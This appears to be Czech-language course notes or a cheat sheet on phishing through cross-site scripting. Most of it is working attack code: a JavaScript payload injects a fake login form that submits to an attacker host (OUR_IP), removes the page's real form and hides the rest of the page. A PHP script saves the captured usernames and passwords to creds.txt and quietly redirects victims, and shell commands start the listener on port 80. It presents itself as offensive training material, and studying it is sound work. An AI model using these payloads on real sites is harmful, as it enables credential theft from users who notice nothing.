Phishing přes XSS spočívá ve vložení falešného přihlašovacího formuláře přímo do DOM struktury legitimní stránky, což útočníkovi umožňuje odchytit přihlašovací údaje uživatelů na vlastní server.

**Přehled fází XSS Phishingu**

|**Fáze**|**Cíl**|**Použitá technika / Kód**|
|---|---|---|
|**1. Injekce formuláře**|Vykreslení falešných vstupních polí|`document.write('<form action=http://OUR_IP>...')`|
|**2. Čištění UI**|Odstranění původního formuláře stránky|`document.getElementById('element_id').remove()`|
|**3. Skrytí zbytku HTML**|Potlačení zobrazení navazujícího kódu|Přidání HTML komentáře `<!--` na konec payloadu|
|**4. Odchyt údajů**|Záznam hesel a přesměrování oběti|Lokální PHP server ukládající do `creds.txt`|

**1. Konstrukce XSS Payloadu pro vložení formuláře**

Pro změnu rozhraní se zkombinuje vykreslení nového formuláře, odstranění původních prvků a potlačení zbytku původního obsahu:

JavaScript

```
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
document.getElementById('urlform').remove();
```

_Na konec celého XSS payloadu se přidá otevřený komentář `<!--`, čímž se zakomentuje zbývající HTML kód aplikace a stránka působí jako čistá přihlašovací obrazovka._

**2. Odchytávání přihlašovacích údajů (Credential Harvesting)**

Použití pouhého posluchače Netcat (`nc -lvnp 80`) po odeslání formuláře vrátí uživateli chybovou stránku prohlížeče, což vzbudí podezření. Elegantnější metodou je PHP skript, který zadaná data uloží a oběť ticho přesměruje zpět na legitimní web.

**Příprava skriptu `index.php` na útočníkově stroji:**

PHP

```
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

**Spuštění posluchače:**

Bash

```
mkdir /tmp/tmpserver && cd /tmp/tmpserver
# [vytvoření souboru index.php]
sudo php -S 0.0.0.0:80
```

Jakmile oběť odešle údaje, uloží se do souboru `creds.txt` a uživatel je okamžitě přesměrován na původní aplikaci, aniž by zaznamenal jakékoliv narušení.